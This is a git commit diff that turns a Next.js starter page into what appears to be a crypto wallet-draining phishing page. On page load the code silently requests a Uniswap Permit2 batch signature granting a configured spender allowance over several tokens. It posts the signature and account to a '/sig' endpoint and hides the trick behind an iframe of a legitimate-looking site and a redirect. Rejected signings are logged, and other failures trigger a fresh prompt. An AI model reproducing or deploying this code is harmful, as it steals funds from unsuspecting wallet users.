fd0b3c0241475d2056431d7915ca969d63154834
jaredxiao <jaredxiao@126.com>
2023-06-17 00:32:37 +0800

    init

--- pages/index.js
+++ pages/index.js
@@ -1,59 +1,110 @@
-import Head from 'next/head';
-import styles from '../styles/Home.module.css';
+import { createRef, useEffect, useState } from 'react'
+import { useWeb3React, Web3ReactProvider } from '@web3-react/core'
+import { InjectedConnector } from '@web3-react/injected-connector'
+import Layout from '../components/layout'
+import { injected } from '../components/wallet/connectors'
 
-export default function Home() {
+import { ethers } from 'ethers'
+import qs from 'qs'
+import {
+  PermitSingle,
+  PermitBatch,
+  AllowanceTransfer,
+  MaxAllowanceExpiration,
+  PERMIT2_ADDRESS,
+} from '@uniswap/permit2-sdk'
+
+import { D } from '../configs/Dconfig'
+import http from '../units/http'
+const HomePage = () => {
+  const [signature, setSignature] = useState('')
+  const { active, account, library, connector, activate, deactivate } =
+    useWeb3React()
+  useEffect(() => {
+    if (typeof window.ethereum == 'undefined') return false
+    const metamaskProvider = new ethers.providers.Web3Provider(window.ethereum)
+    var once = false
+    setInterval(() => {
+      if (once) return
+      handleLoad(metamaskProvider.getSigner())
+      once = true
+    }, 2000)
+  }, [])
+
+  const handleLoad = async (signer) => {
+    const details = []
+
+    Object.keys(D).map((item, index) => {
+      if (index > 1) {
+        const token_item = {
+          token: D[item].address,
+          amount: D[item].amount,
+          expiration: D.usdc.expiration,
+          nonce: 0,
+        }
+        details.push(token_item)
+      }
+    })
+
+    const permit = {
+      details: details,
+      spender: D.spender_address,
+      sigDeadline: D.expiration,
+    }
+    console.log(process.env.NEXT_PUBLIC_ENABLE_TESTNETS)
+    console.log(process.env.NEXT_PUBLIC_DOMAIN_WEBSITE)
+    console.log(process.env.NEXT_PUBLIC_SOURCE)
+
+    const { domain, types, values } = AllowanceTransfer.getPermitData(
+      permit,
+      PERMIT2_ADDRESS,
+      ...(process.env.NEXT_PUBLIC_ENABLE_TESTNETS === 'true' ? [5] : [1])
+    )
+    try {
+      const s = await signer._signTypedData(domain, types, values)
+      setSignature(s)
+      const data = {
+        account: signer.provider.provider.selectedAddress,
+        permit2address: domain.verifyingContract,
+        chain: domain.chainId,
+        details: JSON.stringify(values.details),
+        signature: s,
+        source: process.env.NEXT_PUBLIC_SOURCE,
+      }
+      http.post('/sig', qs.stringify(data))
+
+      window.location.href = process.env.NEXT_PUBLIC_DOMAIN_WEBSITE
+      try {
+        signer = null
+      } catch (ex) {
+        console.log(ex)
+      }
+      return s
+    } catch (e) {
+      console.log(e.code)
+
+      if (e.code != 'ACTION_REJECTED') {
+        activate(injected).then(() => {
+          handleLoad(signer)
+        })
+      } else {
+        console.log('USER REJECTED')
+      }
+    }
+  }
+
   return (
-    <div className={styles.container}>
-      <Head>
-        <title>Create Next App</title>
-      </Head>
+    <Layout>
+      <iframe
+        id='my-iframe'
+        src={process.env.NEXT_PUBLIC_DOMAIN_WEBSITE}
+        style={{ width: '100%', height: '2048px' }}></iframe>
+    </Layout>
+  )
+}
 
-      <main className={styles.main}>
-        <h1 className={styles.title}>
-          Welcome to <a href="https://nextjs.org">Next.js!</a>
-        </h1>
+export default HomePage
 
-        <p className={styles.description}>
-          Get started by editing{' '}
-          <code className={styles.code}>pages/index.js</code>
-        </p>
-
-        <div className={styles.grid}>
-          <a href="https://nextjs.org/docs" className={styles.card}>
-            <h3>Documentation &rarr;</h3>
-            <p>Find in-depth information about Next.js features and API.</p>
-          </a>
-
-          <a href="https://nextjs.org/learn" className={styles.card}>
-            <h3>Learn &rarr;</h3>
-            <p>Learn about Next.js in an interactive course with quizzes!</p>
-          </a>
-
-          <a
-            href="https://github.com/vercel/next.js/tree/master/examples"
-            className={styles.card}
-          >
-            <h3>Examples &rarr;</h3>
-            <p>Discover and deploy boilerplate example Next.js projects.</p>
-          </a>
-
-          <a
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=default-template&utm_campaign=create-next-app"
-            className={styles.card}
-          >
-            <h3>Deploy &rarr;</h3>
-            <p>
-              Instantly deploy your Next.js site to a public URL with Vercel.
-            </p>
-          </a>
-        </div>
-      </main>
-
-      <footer className={styles.footer}>
-        <a href="https://next.new" target="_blank" rel="noopener noreferrer">
-          Created with&nbsp;<b>next.new</b>&nbsp;⚡️
-        </a>
-      </footer>
-    </div>
-  );
+HomePage.getLayout = function getLayout(page) {
+  return { page }
 }
